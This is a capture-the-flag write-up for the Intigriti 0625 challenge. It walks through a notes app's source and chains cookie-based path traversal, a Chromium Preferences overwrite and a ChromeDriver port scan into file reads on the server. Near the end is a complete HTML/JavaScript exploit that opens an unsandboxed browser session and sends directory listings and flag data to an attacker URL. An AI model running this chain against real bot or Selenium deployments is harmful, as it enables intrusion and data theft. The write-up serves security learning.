# Intigriti June Challenge 0625 - writeup
The challenge requires us to gain RCE on the server. The given web application is basically a notes app where we can login to store notes, upload files and also report URLs to a bot. Here's the link to the challenge : https://challenge-0625.intigriti.io/
## Analyzing the web application
Beginning with the login page, we can observe in the dev tools that we have two cookies stored which are- "INSTANCE" and session cookie. On logging in, the page is updated without changing the URL, since it is a single-page web application based on Vue.js. After logging in, we get access to functionality to upload our notes, upload files, download the uploaded files and report URLs to a bot. An observation here on downloading the files which we have uploaded, dots were removed from the filename which suggests sanitization.
## Analyzing the source code
After downloading the source code from the challenge website, we start analyzing the code : 
Following is the code for dockerfile : 
```
FROM python:3.13-slim

RUN apt-get update && \
    apt-get install -y wget unzip curl && \
    apt-get install -y chromium chromium-driver && \
    rm -rf /var/lib/apt/lists/*


COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt


RUN groupadd -r appuser && useradd -r -g appuser -m appuser

WORKDIR /app

COPY . /app

RUN RANDOM_FLAG="$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)" && \
    RANDOM_FILENAME="$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)" && \
    echo "INTIGRITI{$RANDOM_FLAG}" > /flag_$RANDOM_FILENAME.txt && \
    chmod 444 /flag_$RANDOM_FILENAME.txt && \
    echo "Flag copied to /flag_$RANDOM_FILENAME.txt"


RUN mkdir -p /app/instances && \
    chown -R appuser:appuser /app

ENV PATH="/usr/lib/chromium:${PATH}"
ENV CHROME_BIN="/usr/bin/chromium"
ENV CHROMEDRIVER_BIN="/usr/bin/chromedriver"

EXPOSE 1337

USER appuser

CMD ["python3", "app.py"]
```
So the flag is stored in a file with randomized file name.
On reviewing the utils.py file, we observe that we can upload any file but the filename is being sanitized.
```
def sanitize_filename(filename):
    return re.sub(r'[^A-Za-z0-9_/]', '', filename)
```
Similarly username is also sanitized but since '.' are allowed, we'll see later on that this can be used in path traversal.
```
def sanitize_username(username):
    return re.sub(r'[^A-Za-z0-9_.-]', '', username)
```
After that, on reading the app.py file, we understand how the instance_id is being managed.
```
@app.before_request
def before_request():
    if request.endpoint != 'static':
        instance_id = get_or_create_instance_id()
        
        previous_instance = session.get('instance_id')
        
        if previous_instance and previous_instance != instance_id:
            logout_user()
        
        db_path = get_instance_path(instance_id, "app.db")
        app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
        
        check_and_update_schema(db_path)
        
        with app.app_context():
            db.create_all()
```
The get_or_create_instance_id function is defined in the instance_manager.py file : 
```
    if 'instance_id' in session and is_valid_instance_id(session['instance_id']):
        return session['instance_id']
    
    instance_id = request.cookies.get('INSTANCE')
    
    if not is_valid_instance_id(instance_id):
        instance_id = str(uuid.uuid4())
        print(f"Creating new instance: {instance_id}")
    
    instance_dir = os.path.join(INSTANCES_DIR, instance_id)
    if not os.path.exists(instance_dir):
        os.makedirs(instance_dir)
        os.makedirs(os.path.join(instance_dir, "notes"), exist_ok=True)
        os.makedirs(os.path.join(instance_dir, "chrome_profile"), exist_ok=True)
    
    update_instance_timestamp(instance_id, app=current_app)
    
    session['instance_id'] = instance_id
    
    return instance_id
```
### Quick summary of instance_id functionality 
So basically before every request, the code uses the get_or_create_instance_id function to get the instance_id from either the one tied with session or the INSTANCE cookie and if none exists then it creates a random one with *str(uuid.uuid4())*. Then the instance_id variable is compared with the instance id tied with session cookie and if they are not equal then the user is logged out. Note here that if there is no session cookie then functionality will be normal and user will not be logged out.
<br>
<br>
Here we can spot that the **instance_id is not sanitized**. So since it is used in directory creation, there is a potential path traversal vulnerability. We can set the "INSTANCE" cookie as any arbitrary value which we'll later see will help in overwriting a file using the given file upload functionality.
<br>
## Uploading files with '.' in filename 
Next checking out the utils.py file, we see the function setting up chromium settings for the bot. Interesting thing to note here is the `chrome_options.add_argument(f"--user-data-dir={get_instance_path(instance_id, 'chrome_profile')}")` line. In chromium, "--user-data-dir" flag allows you to specify a custom location for the user data directory, which contain files related to a individual chromium profile. As this is based on the instance_id value which is not sanitized, we can use path traversal to overwrite default chromium preferences file for some other instance id. This can help us in the following way - We can change the preferences and set startup url for the browser as link to our webhook. In our webhook response, we can set the content type to application/octet-stream so that instead of rendering, the file gets downloaded. Hence we can upload any arbitrary file on the server in any directory (by changing the default downloading directory while overwriting the preferences file).
<br><br>
In the 'routes.py' file, bot receives the reported url at '/api/visit' endpoint and it only accepts URLs starting with "http://localhost:1337/" and the browser gets closed after 15 seconds.
```
@app.route('/api/visit', methods=['POST'])
    @login_required
    def visit_url():
        instance_id = get_or_create_instance_id()
        data = request.get_json()
        url = data.get('url')
        
        if not validate_url(url):
            return error_response('URL not valid', 400)
        
        response = {
            'success': True, 
            'message': 'URL is valid! Starting the bot...',
            'status': 'url_valid'
        }
        
        try:
            chrome_options = get_chrome_options(instance_id)
            driver = webdriver.Chrome(options=chrome_options)
            
            driver.get(url)
            time.sleep(15)
            
            driver.quit()
            
            response['message'] = 'Page visited successfully!'
            response['status'] = 'visit_complete'
            
            return set_instance_cookie(jsonify(response), instance_id)
        except Exception as e:
            print(f"Bot error: {str(e)}", file=sys.stderr)
            return error_response('Bot crash...', 500)
```
```
def validate_url(url):
        return url.startswith("http://localhost:1337/")
```
Since here we are dealing with a headless browser, the Chrome DevTools Protocols and the ChromeDriver ports are open for controlling the browser. These can only be accessed from localhost. Furthermore, there are some restrictions with Chrome DevTools Protocol that it has a check for the Origin header in WebSocket requests. if the origin is not included in the --remote-allow-origins flag, the connection would be rejected. So we'll attempt to make connection with ChromeDriver and not Chrome DevTools Protocol. In the case of ChromeDriver, it is exposed to localhost but on a random port, so we need to perform a port scan in order to find that port.
<br><br>
On reviewing the code of '/api/notes/upload' given below: 
```
    @app.route('/api/notes/upload', methods=['POST'])
    @login_required
    def upload_note():
        instance_id = get_or_create_instance_id()
        
        if 'file' not in request.files:
            return error_response("No file provided", 400)
        
        file = request.files['file']
        if file.filename == '':
            return error_response("No file selected", 400)

        file.seek(0, os.SEEK_END)
        if file.tell() > 20 * 1024:
            return error_response("File size exceeds 20KB limit.", 400)
        file.seek(0)

        notes_dir = get_instance_path(instance_id, "notes")
        os.makedirs(notes_dir, exist_ok=True)
        
        user_dir = os.path.join(notes_dir, current_user.username)
        os.makedirs(user_dir, exist_ok=True)
        
        filename = sanitize_filename(file.filename)
        file_path = os.path.join(user_dir, filename)
        
        try:
            file.save(file_path)
        except Exception:
            return error_response("Error saving file", 500)
```
We can observe that the file we upload is stored in the '/app/instances/<INSTANCE>/notes/<USERNAME>' folder. So we can register with '..' username and <INSTANCE> set as '../../../app/instances/<INSTANCE1>/chrome_profile/Default/' and when we upload a file with filename - 'Preferences' to overwrite /app/instances/<INSTANCE1>/chrome_profile/Default/Preferences, it works because instances/<INSTANCE>/notes/<USERNAME>/Preferences is resolevd to the target preference file after path traversal. The file we upload should have the following contents - `{"download":{"default_directory":"/app/static"},"session": {"restore_on_startup": 4,"startup_urls": ["https://webhook.site/YOUR_UUID/FILENAME.html"]}}`. This sets the default download directory to /app/static and startup url as our webhook url. We can configure our webhook as explained above and the file will get downloaded to the INSTANCE1's static directory. So if we submit 'http://localhost:1337/' to the bot after changing the preferences file, bot will visit the startup url and will download the 'FILENAME.html' in the default download directory which is '/static'. Later we can log in with INSTANCE cookie set as INSTANCE1 and report the url 'http://localhost:1337/app/static/FILENAME.html' to the bot and hence we can execute arbitrary javascript on the bot's browser.
## Exploitation 
So till now we have achieved arbitrary file upload functionality. We can use this to upload a html file containing javascript code to first scan for the ChromeDriver port and then send a payload to it to eventually get RCE. For the RCE part, we can use a payload with the following pattern :
```
            const payload = {
                capabilities: {
                    alwaysMatch: {
                        "goog:chromeOptions": {
                            binary: "PATH_OF_EXECUTABLE",
                            args: ARGUMENT_ARRAY
                        }
                    }
                }
            };
            await fetch(`http://localhost:${port}/session`, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
```
Here in the PATH_OF_EXECUTABLE, we can use "/usr/lib/chromium/chromium" with the following arguments : `["--headless", "--no-sandbox", "--disable-dev-shm-usage", "--disable-web-security", "--allow-file-access-from-files", f"--user-data-dir=/app/instances/${instance}/chrome_profile"]`
<br>
This loads another chromium instance with unsafe options as it is not sandboxed and also have access to the local files. We'll pass the instance value and the attackerUrl in the parameters in the URL submitted to the bot.
<br>
We need to ensure that after uploading the FILENAME.html, and before submitting its URL to the bot, we change the Preferences file again and set its content as `{"download":{"default_directory":"/tmp"},"session": {"restore_on_startup": 4,"startup_urls": []}}`. This sets the default download directory as '/tmp'. We did this because the script we'll be using in the FILENAME.html will download another html file and setting the default download directory as '/tmp' will drop it into that directory. That HTML file contains an "iframe" which will display the directory listing. We can get the filename of the file containing the flag from there and then access the contents of that file by sending a POST request to our webhook. Below is the complete code of FILENAME.html which will do the above explained procedure : 
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
<script>

const currentUrl = window.location.href;
const url = new URL(currentUrl); 
const attackerUrl = url.searchParams.get("attackerUrl");

const IFRAME_FILE = `<html>
<head>
<script>
function getContent() {
   console.log(iframe_files.contentWindow.document.body.innerHTML);
   fetch(\`${attackerUrl}\`, {method: "POST", body: iframe_files.contentWindow.document.body.innerHTML});
   const el = iframe_files.contentWindow.document.querySelector('[data-value^="flag"]');
   if (el) {
     const flagFileName = el.getAttribute('data-value');
     console.log(flagFileName);
     fetch(\`${attackerUrl}?flag_filename=$\{btoa(encodeURIComponent(flagFileName))\}\`);
     iframe_files.contentWindow.location.href = "file:///"+flagFileName;
   }
   else {
     fetch(\`${attackerUrl}?flag=$\{btoa(encodeURIComponent(iframe_files.contentWindow.document.body.innerHTML))\}\`);
   }
}

<\/script>
</head>
<body>
<iframe onload="getContent()" id="iframe_files" src="file:///"></iframe>
</body>
</html>
`;

async function init () {

    const base64 = btoa(IFRAME_FILE);
    const dataUrl = `data:application/octet-stream;base64,${base64}`;
    const a = document.createElement('a');
    a.href = dataUrl;
    const fileId = url.searchParams.get("fileId");
    a.download = 'iframe_'+fileId+'.html';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    const ports = [];
    for (let i = 45000; i < 65536; i++) {
        ports.push(i);
    }
    
    const checkSeleniumPort = async (port) => {
        try {
            await fetch(`http://localhost:${port}/status`, {
                method: 'GET',
                mode: 'no-cors'
            });
            return true;
        } catch {
            return false;
        }
    };

    const exploitSelenium = async (port) => {
        try {
            fetch(`${attackerUrl}?seleniumPort=${port}`, {
                mode: 'no-cors'
            });
            spanSeleniumPort.innerText = port;
        } catch (e) {
           console.error(e);
        }
        try {
            const instance = url.searchParams.get("instance");
            const payload = {
                capabilities: {
                    alwaysMatch: {
                        "goog:chromeOptions": {
                            binary: "/usr/lib/chromium/chromium",
                            args: ["--headless", "--no-sandbox", "--disable-dev-shm-usage", "--disable-web-security", "--allow-file-access-from-files", `--user-data-dir=/app/instances/${instance}/chrome_profile`]
                        }
                    }
                }
            };
            await fetch(`http://localhost:${port}/session`, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            
            return true;
        } catch (e) {
            console.error(e);
            return false;
        }
    };
    
    const processBatch = async (portBatch) => {
        const seleniumChecks = await Promise.all(portBatch.map(checkSeleniumPort));

        for (let i = 0; i < portBatch.length; i++) {
            if (seleniumChecks[i]) {
                await exploitSelenium(portBatch[i]);
            }
        }
    };

    fetch(`${attackerUrl}?startScanning`, {
        mode: 'no-cors'
    });

    const BATCH_SIZE = 1000;
    for (let i = 0; i < ports.length; i += BATCH_SIZE) {
        if (i%1000==0) {
            fetch(`${attackerUrl}?processBatchStartIndex=${i}`, {
                mode: 'no-cors'
            });
            spanProcessBatchStartIndex.innerText = i;
        }
        await processBatch(ports.slice(i, i + BATCH_SIZE));
    }
}
</script>
</head>
<body onload="init()">
processBatchStartIndex <span id="spanProcessBatchStartIndex"></span><br>
seleniumPort <span id="spanSeleniumPort"></span>
</body>
</html>
```
